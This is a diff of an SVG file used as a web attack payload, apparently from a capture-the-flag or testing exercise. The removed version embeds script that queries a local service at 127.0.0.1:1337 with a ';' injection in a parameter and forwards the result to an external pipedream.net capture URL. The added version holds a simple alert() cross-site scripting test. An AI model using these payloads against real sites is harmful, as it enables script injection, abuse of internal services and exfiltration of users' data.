@@ -1,6 +1,3 @@
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50">
-    <script>//<![CDATA[
-        fetch('http://127.0.0.1:1337/api/cal?modifier=;').then(r => r.text()).then(p => fetch('https://en12jf9wwa44sp.x.pipedream.net/debug='+p))
-    //]]>
-    </script>
+<svg xmlns="http://www.w3.org/2000/svg">
+    <script>alert('ciao');</script>
 </svg>
